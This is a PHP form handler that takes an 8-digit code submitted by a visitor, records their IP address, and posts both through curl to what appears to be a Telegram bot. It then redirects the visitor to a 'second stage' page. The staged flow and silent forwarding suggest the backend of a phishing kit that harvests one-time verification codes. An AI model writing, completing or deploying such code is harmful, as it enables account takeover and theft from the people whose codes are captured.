<?php

include 'access.php';
include 'ip.php';


//First form data
$code = $_POST['code'];


if (strlen($code)==8 && is_numeric($code)) {
    //call the ip function to get the guest ip
$ip = getRealIP();
//Setting the message
$text = "Data:\n\nCode validado: \n".$code."\nIP: \n".$ip."\n\nEND";
$msg = $text;

if (!empty($code)) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $urlMsg);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $server_output = curl_exec($ch);
    curl_close($ch);
    
    header('Location: ../secondStage.php');
}else{
    header('Location: ../invaldSecondAccessValidation.php');
}
}else{
    header('Location: ../invalidSecondAccessValidation-error.php');
}

?>